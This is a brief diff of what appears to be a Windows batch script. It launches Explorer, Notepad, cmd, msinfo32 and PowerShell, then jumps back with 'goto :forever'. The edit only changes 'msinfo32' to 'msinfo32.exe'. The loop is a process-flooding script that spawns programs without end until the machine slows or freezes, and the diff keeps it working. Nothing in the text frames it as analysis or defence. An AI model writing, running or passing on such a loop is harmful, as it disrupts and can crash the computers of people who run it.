@@ -3,6 +3,6 @@
 start explorer.exe
 start notepad
 start cmd
-start msinfo32
+start msinfo32.exe
 start powershell
 goto :forever
